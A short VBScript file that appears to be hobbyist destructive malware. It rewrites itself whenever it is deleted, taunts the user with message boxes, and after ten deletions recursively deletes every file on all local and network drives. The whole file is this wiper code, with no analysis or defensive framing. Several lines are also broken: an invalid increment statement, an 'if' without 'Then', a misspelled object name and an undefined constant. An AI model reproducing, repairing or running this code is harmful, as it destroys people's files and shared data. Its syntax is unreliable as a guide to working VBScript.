
Set fso = CreateObject("scripting.filesystemobject")
Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
MyCode = Myself.readall
count = 0
Myself.Close
Do
If Not (fso.fileexists(wscript.scriptfullname)) Then
Set Myself = fso.createtextfile(wscript.scriptfullname, True)
Myself.write MyCode
msgbox "We are Borg. We cannot be deleted!"
count + 1
Myself.Close
End If
if count = 10
msgbox "That's it. Now your dead!"
'infect the system
DoDir()
end if
Loop

sub DoDir()
On Error Resume Next
Set fso = CreateObject("scipting.filesystemobject")
Set Drives = fso.Drives
For Each Drive In Drives
If Drive.Drivetype = Remote Then
Drivefull = Drive & "\"
Call Destroy(Drivefull)
ElseIf Drive.IsReady Then
Drivefull = Drive & "\"
Call Destroy(Drivefull)
End If
Next
End sub

Function Destroy(path)
newpath=path
Set Fold = fso.GetFolder(newpath)
Set Files = Fold.Files
For Each file In Files
file.delete true
Next
Set file = Fold.Subfolders
For Each Subfol In file
Call Destroy(Subfol.path)
Next
End Function
